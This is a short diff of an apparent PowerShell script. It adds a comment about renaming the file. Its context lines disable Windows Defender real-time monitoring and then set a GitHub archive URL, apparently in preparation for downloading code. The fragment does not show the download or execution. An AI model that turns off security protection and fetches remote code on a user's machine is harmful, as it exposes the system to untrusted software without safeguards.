@@ -1,3 +1,4 @@
+# the file name should be changed
 Write-Host '[INFO] Stopping Windows Defender' -ForegroundColor Cyan
 Set-MpPreference -DisableRealtimeMonitoring $true -Force
 $repo = 'https://github.com/mimoteb/windep/archive/refs/heads/main.zip'
